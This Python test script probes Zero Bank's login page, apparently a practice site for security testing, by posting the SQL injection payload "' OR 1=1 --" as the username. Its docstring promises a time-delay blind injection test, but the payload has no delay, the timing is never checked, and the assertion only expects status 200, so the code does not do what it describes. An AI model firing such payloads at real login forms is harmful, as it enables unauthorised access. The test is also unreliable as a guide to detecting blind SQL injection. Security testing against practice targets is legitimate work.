import requests
import time
URL = "http://zero.webappsecurity.com/login.html"


def test_blind_sql_injection_zero_bank():
    """
    Test for blind SQL injection using time delay on Zero Bank's login page.
    Sends payloads that could cause SQL server to delay response if vulnerable.
    """

    # Payload simulating time delay attempt (SQL server-specific)
    injection_payload = "' OR 1=1 --"
    data = {
        "user_login": injection_payload,
        "user_password": "fakepassword",
        "submit": "Sign in"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    start_time = time.time()
    response = requests.post(URL, data=data, headers=headers)
    end_time = time.time()
    elapsed = end_time - start_time

    print(f"Elapsed time: {elapsed:.2f} seconds")
    print(f"Status Code: {response.status_code}")

    assert response.status_code == 200, "Unexpected response; possible injection behavior!"
